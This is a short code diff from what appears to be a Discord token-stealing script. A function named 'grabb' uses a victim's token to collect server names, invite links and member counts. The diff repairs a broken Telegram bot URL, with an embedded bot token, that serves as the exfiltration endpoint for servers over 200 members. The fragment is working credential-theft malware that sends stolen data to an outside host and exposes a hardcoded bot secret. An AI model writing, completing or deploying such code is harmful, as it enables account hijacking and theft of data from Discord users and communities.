@@ -118,8 +118,7 @@ async function grabb(applicationId, token) {
       const invite = await getServerInvite(guild.id, token);
       const memberCount = await getGuildMemberCount(guild.id, token);
       if (Number(memberCount.total) > 200) {
-        webhookURL = "https://api.telegram.org/bot>
-7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
+        webhookURL = "https://api.telegram.org/bot7849468467:AAG4CXcuU6zvvWwWQhtl8JApWr1GeqlZNrQ/sendMessage";
       }
       return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${memberCount.total || ''} Membros\` (\`${memberCount.online} Online\`)`;
     })
